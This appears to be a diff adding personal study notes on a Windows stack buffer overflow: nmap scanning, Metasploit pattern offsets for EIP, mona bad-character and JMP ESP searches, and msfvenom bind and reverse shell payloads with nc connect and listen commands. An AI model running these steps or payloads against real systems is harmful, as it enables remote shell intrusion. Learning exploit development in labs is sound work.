@@ -1,0 +1,41 @@
+>> ping
+>> nmap -p<vuln_app_port> ip 
+
+
+----------->>>>>------PATTERN------------------------------
+
+>> msf-pattern_create -l <lenght_of_char>
+>> msf-patter_offset -g  <EIP_value>
+
+-------------------------------------------------
+then check if we can control EIP using BBBB
+
+
+------------->>>>---------BAD CHARS----------------------------
+
+>> !mona config -set workingfolder C:\logs\%p
+>> !mona bytearray
+>> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01B27464
+>> !mona bytearray -b "\x00\x01\x02"
+>> !mona compare -f  C:\logs\app_folder\bytearray.bin -a 01337IIO
+
+
+
+
+------------>>>>>-----------JMP ESP ----------------------------
+
+>> !mona modules
+>> !mona find -s "\xff\xe4" -m app.dll   or >>!mona find -s "\xff\xe4" -m app.exe
+
+----------------------------------------------------
+in case no jmp esp . check for call esp ---> mona modules --> check dlls --> doba click --> ctrl + f --> jmp esp or call esp --> note the address
+----------------------------------------------------
+
+
+>> msfvenom -a x86 -p windows/shell/bind_tcp lport=4444 -b "\x00\xd1\x25" -f python
+>> nc -nv <Victim_ip> 4444
+
+>> msfvenom -a x86 -p windows/shell_reverse_tcp lhost=<kali_ip> lport=4444 -b "\x00\xd1\x25" -f python
+>> nc -nlvp 4444
+
+
